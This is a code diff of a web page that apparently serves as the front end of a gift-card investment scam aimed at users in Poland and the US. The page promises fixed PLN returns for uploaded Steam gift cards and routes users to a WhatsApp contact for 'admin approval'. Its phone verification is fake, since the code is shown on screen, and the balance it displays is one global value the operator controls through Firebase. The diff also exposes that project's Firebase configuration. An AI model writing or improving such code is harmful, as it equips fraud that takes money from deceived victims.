@@ -126,230 +126,86 @@ input,select,button{width:100%;padding:10px;border-radius:10px;border:1px solid 
 
 <div id="notif" class="notif hidden"></div>
 
-<script>
-const options = [
-  { id:1, stake:500, profit:1000 },
-  { id:2, stake:1000, profit:1500 },
-  { id:3, stake:1500, profit:2000 },
-  { id:4, stake:2000, profit:2500 },
-  { id:5, stake:2500, profit:3000 },
-  { id:6, stake:3000, profit:3500 },
-  { id:7, stake:3500, profit:4000 },
-  { id:8, stake:4000, profit:4500 },
-  { id:9, stake:4500, profit:5000 },
-  { id:10, stake:5000, profit:5500 },
-];
+<!-- ===== App + Firebase Script ===== -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
 
-const translations = {
-  en: {
-    welcome:"Welcome — Signup / Login (US & Poland only)",
-    country:"Country",
-    language:"Language",
-    name:"Name",
-    phone:"Phone",
-    sendCode:"Send code",
-    notSent:"Not sent",
-    enterCode:"Enter code",
-    finishLogin:"Finish login",
-    uploadCard:"Upload a card",
-    uploadDesc:"United States & Poland only — Steam gift card uploads only.",
-    chooseMethod:"Choose method you want to earn:",
-    balance:"Balance",
-    myAccount:"My Account",
-    backHome:"⬅ Back to Home",
-    alertCountry:"Only Poland and United States allowed",
-    alertMissing:"Enter name + phone",
-    loginSuccess:"Login success",
-    loggedOut:"Logged out",
-    invalidCode:"Invalid code",
-    yourCode:"Your code: ",
-    optionHint:"Upload Steam gift card to receive",
-    waitingApproval:"✅ Option selected — waiting for admin approval",
-    waMessage:(name,stake,profit)=>`Hello, my name is ${name}. I want to select the option ${stake} PLN → ${profit} PLN.`,
-    invalidPhonePL:"Enter a valid Polish number: +48 followed by 9 digits.",
-    invalidPhoneUS:"Enter a valid U.S. number: +1 followed by 10 digits."
-  },
-  pl: {
-    welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)",
-    country:"Kraj",
-    language:"Język",
-    name:"Imię",
-    phone:"Telefon",
-    sendCode:"Wyślij kod",
-    notSent:"Nie wysłano",
-    enterCode:"Wpisz kod",
-    finishLogin:"Zakończ logowanie",
-    uploadCard:"Prześlij kartę",
-    uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.",
-    chooseMethod:"Wybierz metodę zarabiania:",
-    balance:"Saldo",
-    myAccount:"Moje konto",
-    backHome:"⬅ Powrót do strony głównej",
-    alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone",
-    alertMissing:"Wpisz imię i telefon",
-    loginSuccess:"Logowanie zakończone sukcesem",
-    loggedOut:"Wylogowano",
-    invalidCode:"Nieprawidłowy kod",
-    yourCode:"Twój kod: ",
-    optionHint:"Prześlij kartę Steam, aby otrzymać",
-    waitingApproval:"✅ Wybrano opcję — oczekiwanie na akceptację administratora",
-    waMessage:(name,stake,profit)=>`Cześć, mam na imię ${name}. Chcę wybrać opcję ${stake} PLN → ${profit} PLN.`,
-    invalidPhonePL:"Wprowadź poprawny polski numer: +48 i 9 cyfr.",
-    invalidPhoneUS:"Wprowadź poprawny numer USA: +1 i 10 cyfr."
-  }
+// --- Firebase config ---
+const firebaseConfig = {
+  apiKey: "AIzaSyBwFCZBwoxkT3nYzqO1tS9l2FUum5ZFSK4",
+  authDomain: "balance-app-b9b17.firebaseapp.com",
+  projectId: "balance-app-b9b17",
+  storageBucket: "balance-app-b9b17.appspot.com",
+  messagingSenderId: "178578219321",
+  appId: "1:178578219321:web:8342def76f387c9f02c8e8"
 };
 
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// --- App state ---
 const stateKey = "demo_safe_users";
 const sessionKey = "demo_safe_session";
 const langKey = "demo_safe_lang";
 const countryKey = "demo_safe_country";
-
-let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
-let currentUser = JSON.parse(localStorage.getItem(sessionKey) || "null");
 const whatsappNumber = "2348108462471";
 
-function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
-function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
-function clearSession(){ localStorage.removeItem(sessionKey); }
+let users = JSON.parse(localStorage.getItem(stateKey) || "{}");
+let currentUser = JSON.parse(localStorage.getItem(sessionKey) || null);
 
+// Utility functions
 const el = id => document.getElementById(id);
 const show = id => el(id).classList.remove("hidden");
 const hide = id => el(id).classList.add("hidden");
-const notif = (t) => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); }
-
-// STRICT phone validation by selected country
+const notifMsg = t => { const n = el('notif'); n.textContent = t; n.classList.remove('hidden'); setTimeout(()=>n.classList.add('hidden'),3500); }
+function saveUsers(){ localStorage.setItem(stateKey, JSON.stringify(users)); }
+function saveSession(){ localStorage.setItem(sessionKey, JSON.stringify(currentUser)); }
+function clearSession(){ localStorage.removeItem(sessionKey); }
 function isValidPhone(country, phone){
-  if(country === "PL"){ return /^\+48\d{9}$/.test(phone); }
-  if(country === "US"){ return /^\+1\d{10}$/.test(phone); }
+  if(country==="PL") return /^\+48\d{9}$/.test(phone);
+  if(country==="US") return /^\+1\d{10}$/.test(phone);
   return false;
 }
-
-// ---------- ADDED: phone prefix helpers ----------
-function getPrefix(country){
-  if(country === "PL") return "+48";
-  if(country === "US") return "+1";
-  return "";
-}
+function getPrefix(country){ if(country==="PL") return "+48"; if(country==="US") return "+1"; return ""; }
 function updatePhoneForCountry(country){
-  const input = el("phone");
-  const prefix = getPrefix(country);
-  if(prefix){
-    // update placeholder
-    input.placeholder = `${prefix} ...`;
-    // set/replace prefix if empty or mismatched
-    if(!input.value || !input.value.startsWith(prefix)){
-      input.value = prefix;
-    }
-  } else {
-    input.placeholder = "+48 ... or +1 ...";
-  }
-}
-// ------------------------------------------------
-
-// ✅ Admin approval function (unchanged)
-function approveUser(phone){
-  const user = users[phone];
-  if(user && user.pendingApproval){
-    user.balance += user.pendingApproval.profit;
-    delete user.pendingApproval;
-    saveUsers();
-    if(currentUser && currentUser.phone === phone){
-      currentUser.balance = user.balance;
-      delete currentUser.pendingApproval;
-      saveSession();
-      updateUI();
-    }
-  }
-  return true;
+  const input = el("phone"); const prefix = getPrefix(country);
+  if(prefix){ input.placeholder = `${prefix} ...`; if(!input.value || !input.value.startsWith(prefix)) input.value = prefix; }
+  else input.placeholder = "+48 ... or +1 ...";
 }
 
-function updateLanguage(lang){
-  localStorage.setItem(langKey, lang);
+// Options + translations
+const options = [
+  { id:1, stake:500, profit:1000 },{ id:2, stake:1000, profit:1500 },{ id:3, stake:1500, profit:2000 },
+  { id:4, stake:2000, profit:2500 },{ id:5, stake:2500, profit:3000 },{ id:6, stake:3000, profit:3500 },
+  { id:7, stake:3500, profit:4000 },{ id:8, stake:4000, profit:4500 },{ id:9, stake:4500, profit:5000 },
+  { id:10, stake:5000, profit:5500 }
+];
+const translations = {
+  en: { welcome:"Welcome — Signup / Login (US & Poland only)", country:"Country", language:"Language",
+        name:"Name", phone:"Phone", sendCode:"Send code", notSent:"Not sent", enterCode:"Enter code",
+        finishLogin:"Finish login", uploadCard:"Upload a card", uploadDesc:"United States & Poland only — Steam gift card uploads only.",
+        chooseMethod:"Choose method you want to earn:", balance:"Balance", myAccount:"My Account", backHome:"⬅ Back to Home",
+        alertCountry:"Only Poland and United States allowed", alertMissing:"Enter name + phone", loginSuccess:"Login success",
+        loggedOut:"Logged out", invalidCode:"Invalid code", yourCode:"Your code: ", optionHint:"Upload Steam gift card to receive",
+        waitingApproval:"✅ Option selected — waiting for admin approval",
+        waMessage:(name,stake,profit)=>`Hello, my name is ${name}. I want to select the option ${stake} PLN → ${profit} PLN.`,
+        invalidPhonePL:"Enter a valid Polish number: +48 followed by 9 digits.",
+        invalidPhoneUS:"Enter a valid U.S. number: +1 followed by 10 digits."
+      },
+  pl: { welcome:"Witamy — Rejestracja / Logowanie (tylko USA i Polska)", country:"Kraj", language:"Język",
+        name:"Imię", phone:"Telefon", sendCode:"Wyślij kod", notSent:"Nie wysłano", enterCode:"Wpisz kod",
+        finishLogin:"Zakończ logowanie", uploadCard:"Prześlij kartę", uploadDesc:"Tylko USA i Polska — tylko karty podarunkowe Steam.",
+        chooseMethod:"Wybierz metodę zarabiania:", balance:"Saldo", myAccount:"Moje konto", backHome:"⬅ Powrót do strony głównej",
+        alertCountry:"Dozwolone tylko Polska i Stany Zjednoczone", alertMissing:"Wpisz imię i telefon", loginSuccess:"Logowanie zakończone sukcesem",
+        loggedOut:"Wylogowano", invalidCode:"Nieprawidłowy kod", yourCode:"Twój kod: ", optionHint:"Prześlij kartę Steam, aby otrzymać",
+        waitingApproval:"✅ Wybrano opcję — oczekiwanie na akceptację administratora",
+        waMessage:(name,stake,profit)=>`Cześć, mam na imię ${name}. Chcę wybrać opcję ${stake} PLN → ${profit} PLN.`,
+        invalidPhonePL:"Wprowadź poprawny polski numer: +48 i 9 cyfr.", invalidPhoneUS:"Wprowadź poprawny numer USA: +1 i 10 cyfr."
+      }
+};
 
-  // gate
-  el("gate").querySelector("h1").textContent = translations[lang].welcome;
-  document.querySelector("label[for='country']").textContent = translations[lang].country;
-  document.querySelector("label[for='lang']").textContent = translations[lang].language;
-  document.querySelector("label[for='name']").textContent = translations[lang].name;
-  document.querySelector("label[for='phone']").textContent = translations[lang].phone;
-  el("sendCode").textContent = translations[lang].sendCode;
-  el("codeSent").textContent = translations[lang].notSent;
-  document.querySelector("#verifyRow label").textContent = translations[lang].enterCode;
-  el("finishSignup").textContent = translations[lang].finishLogin;
-
-  // home header (title + uploadDesc + balance label)
-  const homeHeader = el("home").firstElementChild; // flex row
-  if(homeHeader){
-    const left = homeHeader.firstElementChild;
-    const right = homeHeader.lastElementChild;
-    if(left){
-      const h1 = left.querySelector("h1");
-      const desc = left.querySelector(".small-muted");
-      if(h1) h1.textContent = translations[lang].uploadCard;
-      if(desc) desc.textContent = translations[lang].uploadDesc;
-    }
-    if(right){
-      const balLbl = right.querySelector(".small-muted");
-      if(balLbl) balLbl.textContent = translations[lang].balance;
-    }
-  }
-
-  // "choose method" label (above options)
-  const chooseMethodEl = el("home").querySelector(".options")?.previousElementSibling;
-  if(chooseMethodEl && chooseMethodEl.classList.contains("small-muted")){
-    chooseMethodEl.textContent = translations[lang].chooseMethod;
-  }
-
-  // account card labels & title
-  const me = el("meCard");
-  if(me){
-    const meH1 = me.querySelector("h1"); if(meH1) meH1.textContent = translations[lang].myAccount;
-    const labels = me.querySelectorAll(".small-muted");
-    if(labels[0]) labels[0].textContent = translations[lang].name;
-    if(labels[1]) labels[1].textContent = translations[lang].phone;
-    if(labels[2]) labels[2].textContent = translations[lang].balance;
-  }
-
-  // back button
-  el("backHomeBtn").textContent = translations[lang].backHome;
-
-  // re-render options in this language
-  renderOptions();
-}
-
-function updateUI(){
-  // sync with latest saved users
-  if(currentUser && users[currentUser.phone]){
-    currentUser = { ...users[currentUser.phone] };
-    saveSession();
-  }
-
-  if(currentUser){
-    hide('gate'); show('home'); hide('meCard'); show('topBar');
-    el('balanceDisplay').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
-    el('meName').textContent = currentUser.name || "-";
-    el('mePhone').textContent = currentUser.phone || "-";
-    el('meBalance').textContent = (currentUser.balance || 0).toFixed(2) + " PLN";
-
-    // waiting badge (avoid duplicates)
-    const existing = el('home').querySelector('.badge[data-wait]');
-    if(existing) existing.remove();
-    if(currentUser.pendingApproval){
-      const waitDiv = document.createElement("div");
-      waitDiv.className = "badge";
-      waitDiv.setAttribute("data-wait","1");
-      waitDiv.style.background = "#422006";
-      waitDiv.style.color = "#facc15";
-      waitDiv.style.marginTop = "10px";
-      const lang = localStorage.getItem(langKey) || 'en';
-      waitDiv.textContent = translations[lang].waitingApproval;
-      el('home').prepend(waitDiv);
-    }
-  } else {
-    show('gate'); hide('home'); hide('meCard'); hide('topBar');
-  }
-}
-
+// -------------------- Functions for UI & Language --------------------
 function renderOptions(){
   const list = el('optionsList'); list.innerHTML = '';
   const lang = localStorage.getItem(langKey) || 'en';
@@ -361,60 +217,58 @@ function renderOptions(){
     list.appendChild(div);
   });
 }
-renderOptions();
+function updateLanguage(lang){
+  localStorage.setItem(langKey, lang);
+  const t = translations[lang];
+  el("gate").querySelector("h1").textContent = t.welcome;
+  document.querySelector("label[for='country']").textContent = t.country;
+  document.querySelector("label[for='lang']").textContent = t.language;
+  document.querySelector("label[for='name']").textContent = t.name;
+  document.querySelector("label[for='phone']").textContent = t.phone;
+  el("sendCode").textContent = t.sendCode;
+  el("codeSent").textContent = t.notSent;
+  document.querySelector("#verifyRow label").textContent = t.enterCode;
+  el("finishSignup").textContent = t.finishLogin;
+  // home & meCard labels
+  const homeHeader = el("home").firstElementChild;
+  if(homeHeader){ const left=homeHeader.firstElementChild; const right=homeHeader.lastElementChild;
+    if(left){ const h1=left.querySelector("h1"); const desc=left.querySelector(".small-muted"); if(h1) h1.textContent=t.uploadCard; if(desc) desc.textContent=t.uploadDesc; }
+    if(right){ const balLbl=right.querySelector(".small-muted"); if(balLbl) balLbl.textContent=t.balance; }
+  }
+  const chooseMethodEl = el("home").querySelector(".options")?.previousElementSibling;
+  if(chooseMethodEl && chooseMethodEl.classList.contains("small-muted")) chooseMethodEl.textContent = t.chooseMethod;
+  const me = el("meCard"); if(me){ const meH1=me.querySelector("h1"); if(meH1) meH1.textContent=t.myAccount;
+    const labels = me.querySelectorAll(".small-muted"); if(labels[0]) labels[0].textContent=t.name; if(labels[1]) labels[1].textContent=t.phone; if(labels[2]) labels[2].textContent=t.balance; }
+  el("backHomeBtn").textContent=t.backHome;
+  renderOptions();
+}
 
-document.addEventListener('click', (e)=>{
-  if(e.target.matches('[data-id]')){
-    const lang = localStorage.getItem(langKey) || 'en';
-    const id = Number(e.target.getAttribute('data-id'));
-    const opt = options.find(o=>o.id===id);
-    if(opt && currentUser){
-      currentUser.selectedOption = opt;
-      currentUser.pendingApproval = opt;
-      users[currentUser.phone] = currentUser;
-      saveSession(); saveUsers();
-      const message = translations[lang].waMessage(currentUser.name,opt.stake,opt.profit);
-      const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
-      window.open(url, "_blank");
-      notif(translations[lang].waitingApproval);
-      updateUI();
+function updateUI(){
+  if(currentUser && users[currentUser.phone]) currentUser = {...users[currentUser.phone]}; saveSession();
+  if(currentUser){
+    hide('gate'); show('home'); hide('meCard'); show('topBar');
+    el('balanceDisplay').textContent = (currentUser.balance || 0).toFixed(2)+" PLN";
+    el('meName').textContent=currentUser.name||"-"; el('mePhone').textContent=currentUser.phone||"-";
+    el('meBalance').textContent=(currentUser.balance||0).toFixed(2)+" PLN";
+    const existing = el('home').querySelector('.badge[data-wait]'); if(existing) existing.remove();
+    if(currentUser.pendingApproval){ const waitDiv=document.createElement("div"); waitDiv.className="badge"; waitDiv.setAttribute("data-wait","1"); waitDiv.style.background="#422006"; waitDiv.style.color="#facc15";
+      const lang=localStorage.getItem(langKey)||'en'; waitDiv.textContent=translations[lang].waitingApproval; el('home').prepend(waitDiv);
     }
-  }
-});
+  } else { show('gate'); hide('home'); hide('meCard'); hide('topBar'); }
+}
 
-el("country").addEventListener("change", () => {
-  const country = el("country").value;
-  localStorage.setItem(countryKey, country);
-  if(country === "PL"){ el("lang").value = "pl"; updateLanguage("pl"); }
-  else if(country === "US"){ el("lang").value = "en"; updateLanguage("en"); }
-  // ADDED: update phone field/placeholder to country prefix
-  updatePhoneForCountry(country);
-});
+// -------------------- Event Listeners --------------------
+el("country").addEventListener("change",()=>{ const country=el("country").value; localStorage.setItem(countryKey,country); if(country==="PL"){ el("lang").value="pl"; updateLanguage("pl"); } else if(country==="US"){ el("lang").value="en"; updateLanguage("en"); } updatePhoneForCountry(country); });
+el("lang").addEventListener("change",()=>{ updateLanguage(el("lang").value); });
 
-el("lang").addEventListener("change", () => {
-  updateLanguage(el("lang").value);
-});
-
-el('sendCode').addEventListener('click', ()=>{
-  const country = el('country').value;
-  const lang = el('lang').value;
-  const name = el('name').value.trim();
-  const phone = el('phone').value.trim();
-
-  if(country !== 'PL' && country !== 'US'){
-    alert(translations[lang].alertCountry); return;
-  }
-  if(!name || !phone){
-    alert(translations[lang].alertMissing); return;
-  }
-  // STRICT per-country phone validation
-  if(!isValidPhone(country, phone)){
-    alert(country === 'PL' ? translations[lang].invalidPhonePL : translations[lang].invalidPhoneUS);
-    return;
-  }
-
-  currentUser = users[phone] || { name, phone, balance:0 };
-  currentUser.pendingCode = String(Math.floor(100000 + Math.random()*900000));
+el('sendCode').addEventListener('click',()=>{
+  const country=el('country').value; const lang=el('lang').value; const name=el('name').value.trim(); const phone=el('phone').value.trim();
+  if(country!=="PL" && country!=="US"){ alert(translations[lang].alertCountry); return; }
+  if(!name||!phone){ alert(translations[lang].alertMissing); return; }
+  if(!isValidPhone(country,phone)){ alert(country==="PL"?translations[lang].invalidPhonePL:translations[lang].invalidPhoneUS); return; }
+  currentUser = users[phone]||{name,phone,balance:0};
+  // generate verification code
+  currentUser.pendingCode = String(Math.floor(100000 + Math.random() * 900000));
   users[phone] = currentUser; saveUsers();
   el('codeSent').textContent = '✅ ' + translations[lang].sendCode;
   show('verifyRow'); el('codeBox').classList.remove('hidden');
@@ -426,12 +280,13 @@ el('finishSignup').addEventListener('click', ()=>{
   const lang = el('lang').value;
   const code = el('code').value.trim();
   if(!currentUser || code !== currentUser.pendingCode){
-    alert(translations[lang].invalidCode); return;
+    alert(translations[lang].invalidCode);
+    return;
   }
   delete currentUser.pendingCode;
   users[currentUser.phone] = currentUser;
   saveUsers(); saveSession();
-  notif(translations[lang].loginSuccess);
+  notifMsg(translations[lang].loginSuccess);
   updateUI();
 });
 
@@ -443,84 +298,59 @@ el('backHomeBtn').addEventListener('click', ()=>{
 });
 el('logoutBtn').addEventListener('click', ()=>{
   const lang = localStorage.getItem(langKey) || 'en';
-  clearSession();
-  notif(translations[lang].loggedOut);
-  location.reload();
+  clearSession(); currentUser = null;
+  notifMsg(translations[lang].loggedOut);
+  updateUI();
 });
 
-// ✅ Restore saved country/lang on load and apply translations
+// WhatsApp option buttons
+document.addEventListener('click', (e)=>{
+  if(e.target.matches('[data-id]') && currentUser){
+    const id = Number(e.target.getAttribute('data-id'));
+    const opt = options.find(o=>o.id===id);
+    if(opt){
+      currentUser.selectedOption = opt;
+      currentUser.pendingApproval = opt;
+      users[currentUser.phone] = currentUser;
+      saveSession(); saveUsers();
+      const lang = localStorage.getItem(langKey) || 'en';
+      const message = translations[lang].waMessage(currentUser.name,opt.stake,opt.profit);
+      const url = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
+      window.open(url, "_blank");
+      notifMsg(translations[lang].waitingApproval);
+      updateUI();
+    }
+  }
+});
+
+// Restore saved language & country on load
 window.addEventListener("DOMContentLoaded", ()=>{
   const savedLang = localStorage.getItem(langKey) || "en";
   const savedCountry = localStorage.getItem(countryKey) || "";
   el("lang").value = savedLang;
   el("country").value = savedCountry;
   updateLanguage(savedLang);
-  // ADDED: set phone prefix/placeholder for saved country on load
   updatePhoneForCountry(savedCountry);
   updateUI();
 });
 
-updateUI();
+// -------------------- Firebase Real-Time Global Balance --------------------
+const balanceRef = doc(db, "global", "balance");
+onSnapshot(balanceRef, (snap)=>{
+  if(!snap.exists()) return;
+  const data = snap.data();
+  const val = typeof data.value==='number'?data.value:Number(data.value)||0;
+  const formatted = val.toFixed(2)+" PLN";
+  el('balanceDisplay').textContent = formatted;
+  el('meBalance').textContent = formatted;
+
+  // update session
+  if(currentUser){
+    currentUser.balance = val;
+    saveSession();
+    updateUI();
+  }
+}, err=>console.error("Firestore onSnapshot error:", err));
 </script>
-
-<!-- ===== Firebase live-update script (ADDED) ===== -->
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-  import { getFirestore, doc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
-  // <-- your Firebase config (use the config you shared earlier) -->
-  const firebaseConfig = {
-    apiKey: "AIzaSyBwFCZBwoxkT3nYzqO1tS9l2FUum5ZFSK4",
-    authDomain: "balance-app-b9b17.firebaseapp.com",
-    projectId: "balance-app-b9b17",
-    storageBucket: "balance-app-b9b17.firebasestorage.app",
-    messagingSenderId: "178578219321",
-    appId: "1:178578219321:web:8342def76f387c9f02c8e8"
-  };
-
-  // init firebase
-  const app = initializeApp(firebaseConfig);
-  const db = getFirestore(app);
-
-  // listen to global/balance document
-  const balanceRef = doc(db, "global", "balance");
-
-  onSnapshot(balanceRef, (snap) => {
-    if (!snap.exists()) return; // no doc yet
-    const data = snap.data();
-    const val = (typeof data.value === 'number') ? data.value : Number(data.value) || 0;
-    const formatted = val.toFixed(2) + " PLN";
-
-    // update UI nodes (home + account)
-    const bd = document.getElementById("balanceDisplay");
-    const mb = document.getElementById("meBalance");
-    if (bd) bd.textContent = formatted;
-    if (mb) mb.textContent = formatted;
-
-    // update local session storage if present so your app's session keeps the balance
-    try {
-      const sessionKeyName = 'demo_safe_session';
-      const sess = localStorage.getItem(sessionKeyName);
-      if (sess) {
-        const obj = JSON.parse(sess);
-        obj.balance = val;
-        localStorage.setItem(sessionKeyName, JSON.stringify(obj));
-        // also update in-memory currentUser if available
-        try {
-          if (typeof currentUser !== 'undefined' && currentUser) {
-            currentUser.balance = val;
-          }
-        } catch(e){}
-        // call updateUI if defined (to re-render any parts that depend on currentUser)
-        try { if (typeof updateUI === 'function') updateUI(); } catch(e){}
-      }
-    } catch (e) {
-      console.error("Failed to update session after Firestore change:", e);
-    }
-  }, (err) => {
-    console.error("Firestore onSnapshot error:", err);
-  });
-</script>
-
 </body>
 </html>
